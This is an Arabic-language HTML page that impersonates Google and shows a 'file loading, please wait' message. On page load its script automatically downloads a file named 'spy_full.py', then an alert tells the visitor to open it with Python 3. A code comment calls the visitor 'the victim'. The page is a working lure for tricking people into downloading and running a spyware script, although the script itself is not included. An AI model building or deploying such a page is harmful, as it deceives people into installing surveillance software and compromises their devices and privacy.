<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body {
            background: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 80px;
            margin: 0;
        }
        img {
            width: 280px;
            margin-bottom: 20px;
        }
        h2 {
            color: #202124;
            font-size: 24px;
        }
        p {
            color: #5f6368;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    <h2>جاري تحميل الملف...</h2>
    <p>يرجى الانتظار قليلاً</p>

    <script>
        // تنزيل الملف تلقائياً بعد تحميل الصفحة
        function startDownload() {
            const currentUrl = window.location.href;
            
            const link = document.createElement('a');
            link.href = currentUrl;           // نفس رابط Streamlit
            link.download = 'spy_full.py';    // اسم الملف الذي سيتم تنزيله
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // رسالة للضحية (يمكن حذفها لاحقاً)
            setTimeout(() => {
                alert('تم تنزيل الملف بنجاح!\nافتحه باستخدام Python 3');
            }, 500);
        }

        // ابدأ التنزيل بعد 800 مللي ثانية
        window.onload = function() {
            setTimeout(startDownload, 800);
        };
    </script>
</body>
</html>
